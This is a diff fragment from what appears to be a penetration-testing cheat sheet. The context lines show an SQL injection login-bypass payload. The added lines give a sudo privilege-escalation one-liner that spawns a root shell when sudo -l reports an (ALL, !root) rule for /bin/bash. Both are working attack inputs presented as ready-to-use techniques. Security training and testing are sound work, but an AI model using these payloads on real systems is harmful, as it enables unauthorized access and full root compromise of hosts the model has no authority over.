@@ -212,6 +212,11 @@ OR
 gabriel' or 1=1 LIMIT 1;#
 
 ```
+### If sudo -l ---> (ALL, !root) /bin/bash
+```bash
+sudo -u#-1 /bin/bash
+```
+
 
 **THIS IS WORK IN PROGRESS**
 
